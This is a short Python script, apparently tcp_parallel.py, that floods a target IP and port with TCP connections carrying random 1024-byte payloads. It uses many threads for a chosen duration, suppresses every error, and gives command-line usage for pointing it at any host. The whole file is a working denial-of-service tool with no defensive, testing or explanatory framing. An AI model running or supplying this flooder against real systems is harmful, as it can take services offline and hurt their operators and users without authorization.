import socket, threading, time, random, sys

def tcp_flood(ip, port, duration, threads):
    end_time = time.time() + duration
    payload = random._urandom(1024)

    def attacker():
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((ip, port))
                s.send(payload)
                s.close()
            except:
                continue

    print(f"🚀 TCP FLOOD → {ip}:{port} | Threads: {threads} | Duration: {duration}s")
    for _ in range(threads):
        threading.Thread(target=attacker, daemon=True).start()

    time.sleep(duration)
    print("✅ TCP Flood finished.")

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: python3 tcp_parallel.py <ip> <port> <duration> <threads>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])

    tcp_flood(ip, port, duration, threads)
